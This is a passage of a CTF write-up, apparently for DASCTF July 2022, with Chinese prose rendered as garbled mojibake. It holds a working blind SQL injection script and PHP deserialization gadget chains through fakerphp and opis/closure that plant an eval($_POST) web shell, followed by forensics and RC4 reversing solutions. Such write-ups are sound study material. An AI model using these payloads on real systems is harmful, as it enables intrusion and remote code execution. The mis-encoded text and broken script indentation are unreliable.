<p>æŸ¥çœ‹æºç å¯ä»¥å‘ç°å­˜åœ¨idå‚æ•°ï¼Œå­˜åœ¨sqlæ³¨å…¥ï¼Œå‰é¢è¿‡æ»¤äº†ä¸€äº›ç‰¹æ®Šç¬¦å·ä½†æ˜¯bpä¼ è¾“å¯ä»¥å‘ç°å‰ç«¯ä¼šè·³è½¬ä½†æ˜¯è¿™é‡Œä¸ä¼šï¼Œè¯´æ˜é‚£äº›è¿‡æ»¤ä¸€ç‚¹ç”¨éƒ½æ²¡æœ‰</p>
<p><img src="https://img-blog.csdnimg.cn/d7378e40d1b7476f8c9a9bc78afcd3b9.png" alt="img"></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c13ddec7-2847-49da-a9ac-5fa290687898.node4.buuoj.cn:81/SUPPERAPI.php?id=&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">126</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># payload = &quot;1 and ascii(substr((database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;&quot;.format(i, mid)</span></span><br><span class="line">        <span class="comment"># payload = &quot;1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#123;&#125;,1))&gt;&#123;&#125;&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        payload = <span class="string">&quot;1 and ascii(substr((select group_concat(password) from users where username=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, mid)</span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h3 id="Newser"><a href="#Newser" class="headerlink" title="Newser"></a>Newser</h3><blockquote>
<p>å¤ç°</p>
</blockquote>
<ul>
<li>phpå¼•ç”¨ç»•è¿‡wakeup | é—­åŒ…å‡½æ•°çš„ååºåˆ—åŒ–</li>
</ul>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247495952&idx=1&sn=989d3f31b154890ebeea701332b3b893&chksm=fbf46b60cc83e2761c083f40f24f0e41d5e9a1b24e1e9fedd911bec243b6f0dd2883323ccc70&mpshare=1&scene=23&srcid=07266JSqMiz5bR6HIwpDfHDL&sharer_sharetime=1658823612725&sharer_shareid=029344dcf9624c2d719bc3d553ed4aa3#rd">DASCTFï½œ2022DASCTF7æœˆèµ‹èƒ½èµ›å®˜æ–¹Write Up (qq.com)</a></p>
<p>æºç </p>
<p>æŸ¥çœ‹Cookieå‘ç°å­˜åœ¨userå€¼ï¼Œbase64è§£ç ä¹‹åæ˜¯Userç±»åºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²ï¼Œæƒ³ç€èƒ½ä¸èƒ½ä»<code>User#__destruct</code> å…¥æ‰‹ï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°å­˜åœ¨<code>__get</code>çš„åŸç”Ÿç±»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$_username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$email</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getEmail</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUsername</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_password = md5(<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_username = base64_encode(<span class="keyword">$this</span>-&gt;username);</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;_username&#x27;</span>,<span class="string">&#x27;_password&#x27;</span>, <span class="string">&#x27;email&#x27;</span>,<span class="string">&#x27;instance&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="keyword">$this</span>-&gt;_password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;User &quot;</span>.<span class="keyword">$this</span>-&gt;instance-&gt;_username.<span class="string">&quot; has created.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>å­¦ä¹ å­¦ä¹ å­¦ä¹ ï¼ï¼ï¼</strong></p>
<p>å­˜åœ¨<code>composer.json</code> æ³„éœ²ï¼Œ<code>fakerphp/faker</code> ä¾èµ–ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œä½†æ˜¯<code>opis/closure</code> çš„ç›¸å…³çŸ¥è¯†åœ¨ä¹‹å‰åšè¿‡ä¸€ç‚¹åˆ†æç›´æ¥ç”¨composerå¯¼å…¥ä¸¤ä¸ªä¾èµ–</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;require&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;fakerphp/faker&quot;</span>: <span class="string">&quot;^1.19&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;opis/closure&quot;</span>: <span class="string">&quot;^3.6&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¼å…¥ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">composer require fakerphp/faker</span><br><span class="line">composer require opis/closure</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹å»å°±æ˜¯å…ˆå®¡è®¡äº†ï¼Œå‰é¢å¡åœ¨äº†æ²¡æ‰¾åˆ°å­˜åœ¨å¯åˆ©ç”¨çš„<code>__get</code> é­”æœ¯æ–¹æ³•çš„åŸç”Ÿç±»ï¼Œé‚£ä¹ˆç°åœ¨å†å…¨å±€æœç´¢ä¸€ä¸‹</p>
<p>åœ¨<code>Generator</code>ç±»ä¸­å­˜åœ¨å¯åˆ©ç”¨çš„ï¼Œåœ¨formatæ–¹æ³•ä¸­è°ƒç”¨åˆ°call_user_func_arrayï¼Œä½†æ˜¯ç±»é‡Œé¢åˆæœ‰__wakeupä½¿å¾—formatters æ•°ç»„è¢«æ¸…ç©ºï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç»•è¿‡è¿™ä¸ªç‚¹ï¼Œå…¶å®è¿™ä¸ªåœ¨ä¹‹å‰nepnepä¸­é‡åˆ°è¿‡ç±»ä¼¼çš„ï¼Œé¢ï¼Œåº”è¯¥è¯´æ˜¯ä¸€æ¨¡ä¸€æ ·ï¼Œä¹Ÿå°±æ˜¯<strong>Laravel 9.1.8</strong> å…¶ä¸­ä¸€æ¡çš„é“¾å­ï¼Œ</p>
<p><a href="https://xz.aliyun.com/t/11362#toc-10">https://xz.aliyun.com/t/11362#toc-10</a></p>
<p><img src="https://img-blog.csdnimg.cn/0423c927c8e04f49a58502a5e61775dc.png" alt="Untitled"></p>
<p>é‚£ä¹ˆåªè¦æŠŠ<code>$this-&gt;formatters</code> ä¸ºæˆ‘ä»¬å¯æ§å±æ€§çš„å¼•ç”¨ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬çš„ä¿®æ”¹è¯¥å€¼çš„æ—¶å€™ç›¸åº”çš„ä¹Ÿä¼šä¿®æ”¹<code>$this-&gt;formatters</code> ä»è€Œç»•è¿‡wakeupã€‚è€ŒUserç±»åœ¨ååºåˆ—åŒ–çš„æ—¶å€™<code>__wakeup</code>é­”æœ¯æ–¹æ³•ä¸­ä¼šä¿®æ”¹<code>$this-&gt;password = $this-&gt;_password;</code> ï¼Œè€Œ<code>$this-&gt;_password</code> åˆæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œè€Œ<code>User#__wakeup</code> åˆæ˜¯åœ¨æœ€åæ‰ä¼šè°ƒç”¨ï¼Œæ‰€ä»¥å°±èƒ½å®ç°å¯¹<code>$this-&gt;formatters</code> çš„ä¿®æ”¹äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        trigger_deprecation(<span class="string">&#x27;fakerphp/faker&#x27;</span>, <span class="string">&#x27;1.14&#x27;</span>, <span class="string">&#x27;Accessing property &quot;%s&quot; is deprecated, use &quot;%s()&quot; instead.&#x27;</span>, <span class="variable">$attribute</span>, <span class="variable">$attribute</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format(<span class="variable">$attribute</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$arguments</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter(<span class="variable">$format</span>), <span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$format</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[<span class="variable">$format</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$format</span>];</span><br><span class="line">        &#125;</span><br><span class="line">â€¦â€¦</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;formatters = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>exp1:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instance = <span class="keyword">new</span> <span class="built_in">Generator</span>(<span class="keyword">$this</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_password = [<span class="string">&quot;_username&quot;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(str_replace(<span class="string">&quot;s:8:\&quot;password\&quot;&quot;</span>,urldecode(<span class="string">&quot;s%3A14%3A%22%00User%00password%22&quot;</span>), serialize(<span class="keyword">new</span> User())));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = &amp;<span class="variable">$user</span>-&gt;password;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/e98f8e9c74c64309aa2a985c7d1d6a37.png" alt="Untitled"></p>
<p>ä½†æ˜¯å‚æ•°æˆ‘ä»¬ä¸å¯æ§ï¼Œä¸è¿‡æ—¢ç„¶å­˜åœ¨é—­åŒ…å‡½æ•°ååºåˆ—åŒ–çš„ä¾èµ–ï¼Œé‚£å°±ç›´æ¥åˆ©ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$_password</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$instance</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">require</span>(<span class="string">&#x27;vendor/opis/closure/autoload.php&#x27;</span>);</span><br><span class="line">            <span class="variable">$a</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ameuu&#x27;</span>]);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="variable">$b</span> = \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instance = <span class="keyword">new</span> <span class="built_in">Generator</span>(<span class="keyword">$this</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_password = [<span class="string">&quot;_username&quot;</span>=&gt;unserialize(<span class="variable">$b</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(str_replace(<span class="string">&quot;s:8:\&quot;password\&quot;&quot;</span>,urldecode(<span class="string">&quot;s%3A14%3A%22%00User%00password%22&quot;</span>), serialize(<span class="keyword">new</span> User())));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = &amp;<span class="variable">$user</span>-&gt;password;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/0caadf13a45b4a929f65768f52e51efe.png" alt="Untitled"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ez-forenisc"><a href="#ez-forenisc" class="headerlink" title="ez_forenisc"></a>ez_forenisc</h3><p>å…ˆæŒ‚è½½çˆ†ç ´å‡ºBitlockçš„ç§˜é’¥</p>
<p><img src="https://img-blog.csdnimg.cn/e23ff324b85e44378e36533f7b83a36d.png" alt="img"></p>
<p>æ‰“å¼€ä¹‹åï¼Œå‘ç°ä¸€ä¸ªcipherè·Ÿtxtï¼Œtxtæ²¡ç”¨ï¼Œcipheré‡Œé¢æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œzstegåˆ†æåï¼Œæœ‰ä¸€ä¸ªzipï¼Œç”¨zstegæå–å‡ºæ¥</p>
<p><img src="https://img-blog.csdnimg.cn/6204c2ad94d2472ab7d3fd3dde3c1118.png" alt="img"></p>
<p>å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…</p>
<p><img src="https://img-blog.csdnimg.cn/3c28e006957e4241a879ff3bdaf7f98f.png" alt="img"></p>
<p>ç„¶åå»æ‰¾ç™»å½•å¯†ç </p>
<p>å–è¯å¤§å¸ˆç›´æ¥æ¢­</p>
<p>å¾—åˆ°</p>
<p> 550f37c7748e  </p>
<p>ç„¶åè§£å‹,å†é‚£å»çœ‹ï¼Œæœ‰äº‹ä¸€ä¸ªkeyï¼Œä¼°è®¡è¿˜æœ‰ä¸œè¥¿æ²¡æ‰¾åˆ°</p>
<p><img src="https://img-blog.csdnimg.cn/9a8ae703b14d433fb7777aa8e38dfc5c.png" alt="img"></p>
<p>æŸ¥çœ‹å±å¹•æˆªå›¾ï¼Œå‘ç°è¿˜æœ‰ä¸€ä¸ªthes3cret</p>
<p><img src="https://img-blog.csdnimg.cn/7bc0dfe418e1400994839bd907d20604.png" alt="img"></p>
<p>dumpä¸‹æ¥</p>
<p><img src="https://img-blog.csdnimg.cn/2cec127e9d874d71b72993979424ed3f.png" alt="img"></p>
<p>ä¸€ä¸²baseï¼Œå¯ä»¥å…ˆæ‹¿å»è§£å¯†ï¼Œå·²ç»å¯ä»¥çŒœåˆ°æ˜¯aesäº†</p>
<p><img src="https://img-blog.csdnimg.cn/65997bf949f244edbec709370f34e773.png" alt="img"></p>
<p>çœ‹åˆ°æ˜¯Saltedå¼€å¤´ï¼Œç¡®å®šæ˜¯aesï¼Œç„¶åè§£å¯†å¾—åˆ°flag</p>
<p><img src="https://img-blog.csdnimg.cn/00206183e0a746509ee1f319ad04da1c.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DASCTF&#123;2df05d6846ea7a0ba948da44daa7dc88&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Colorful-Strips-èµ›åå¤ç°"><a href="#Colorful-Strips-èµ›åå¤ç°" class="headerlink" title="Colorful Strips(èµ›åå¤ç°)"></a>Colorful Strips(èµ›åå¤ç°)</h3><p>è½¬ç°åº¦ï¼Œç”¨jioè½¬ï¼Œè¯•äº†ä¸‹psè¦è°ƒå‚æ•°ï¼Œå¦åˆ™ä¼šä¸¢å¤±è‰²å½©ä¿¡æ¯ï¼Œå‚æ•°å¯ä»¥è°ƒï¼Œä½†è¯•äº†ä¸‹å¾ˆæ¨¡ç³Šï¼Œç­‰é¢„æœŸè§£å§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">img = cv.imread(<span class="string">&#x27;flag.jpg&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">plt.imshow(img, <span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/319a0ee6b9f14685a6666ab19c187c24.png" alt="img"></p>
<h3 id="å¬è¯´ä½ æ˜¯ä¸ªä¾¦æ¢-èµ›åå¤ç°"><a href="#å¬è¯´ä½ æ˜¯ä¸ªä¾¦æ¢-èµ›åå¤ç°" class="headerlink" title="å¬è¯´ä½ æ˜¯ä¸ªä¾¦æ¢(èµ›åå¤ç°)"></a>å¬è¯´ä½ æ˜¯ä¸ªä¾¦æ¢(èµ›åå¤ç°)</h3><p>å¯ä»¥çˆ†ç ´å¯†ç ï¼Œå†™ä¸ªå­—å…¸ï¼Œæœ€åè·‘å‡ºæ¥ICYBETRAYALS</p>
<p>ç„¶åæ ¹æ®æç¤ºï¼Œè¯•äº†ä¸‹ç›²æ°´å°ä½†æ˜¯ä¸è¡Œï¼Œæœ€åæ•æ„Ÿçš„å¯Ÿè§‰ä¸€ä¸‹æ–‡ä»¶åï¼Œå¼‚æˆ–ï¼Œå¾ˆæ— è¯­</p>
<p><img src="https://img-blog.csdnimg.cn/b706ba5a6e8b4afbbbec514efbe46733.png" alt="img"></p>
<p>å‰é¢æ”¹æˆDASCTFå°±è¡Œ</p>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="éšç§˜çš„è§’è½"><a href="#éšç§˜çš„è§’è½" class="headerlink" title="éšç§˜çš„è§’è½"></a>éšç§˜çš„è§’è½</h3><p>å…³é”®å‡½æ•°main_checkflagï¼Œè¾“å…¥ç»è¿‡rc4åŠ å¯†åå’Œmain_encè¿›è¡Œæ ¡éªŒï¼Œå¯†é’¥main_enc_keyï¼šthisiskkk</p>
<p>main_init_0ä¸­å¯¹main_encè¿›è¡Œåˆå§‹åŒ–å¼‚æˆ–</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        <span class="keyword">return</span> s_box</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">        plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">        res = []</span><br><span class="line">        i = j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">            box[i], box[j] = box[j], box[i]</span><br><span class="line">            t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">            k = box[t]</span><br><span class="line">            res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">            cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;è§£å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot;</span> %cipher)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> cipher</span><br><span class="line">a=[<span class="number">0xD8</span>, <span class="number">0xE5</span>, <span class="number">0x85</span>, <span class="number">0xBE</span>, <span class="number">0xE7</span>, <span class="number">0xF8</span>, <span class="number">0x58</span>, <span class="number">0x75</span>, <span class="number">0x95</span>, <span class="number">0x65</span>, </span><br><span class="line"><span class="number">0x85</span>, <span class="number">0xE3</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x59</span>, <span class="number">0xB9</span>, <span class="number">0x14</span>, <span class="number">0x6F</span>, <span class="number">0x33</span>, <span class="number">0xB5</span>, </span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x84</span>, <span class="number">0x0B</span>, <span class="number">0xE7</span>, <span class="number">0x92</span>, <span class="number">0x0E</span>, <span class="number">0xD2</span>, <span class="number">0xFD</span>, <span class="number">0x64</span>, <span class="number">0x18</span>, </span><br><span class="line"><span class="number">0x96</span>, <span class="number">0xD0</span>, <span class="number">0x0F</span>, <span class="number">0x5E</span>, <span class="number">0x44</span>, <span class="number">0x3E</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">            a[i]^=<span class="number">0x23</span></span><br><span class="line">key=<span class="string">&quot;thisiskkk&quot;</span></span><br><span class="line">s=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    s+=<span class="built_in">chr</span>(i)</span><br><span class="line">    s=<span class="built_in">str</span>(base64.b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">rc4_main(key, s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#56e83694-f976-11eb-b343-faffc201c8e0</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/58932b5a14894eee9cf3d3737dc5e2e1.jpeg" alt="img"><img src="https://img-blog.csdnimg.cn/5f6a2fbba839404da1d8b0707669a50f.jpeg" alt="img"></p>
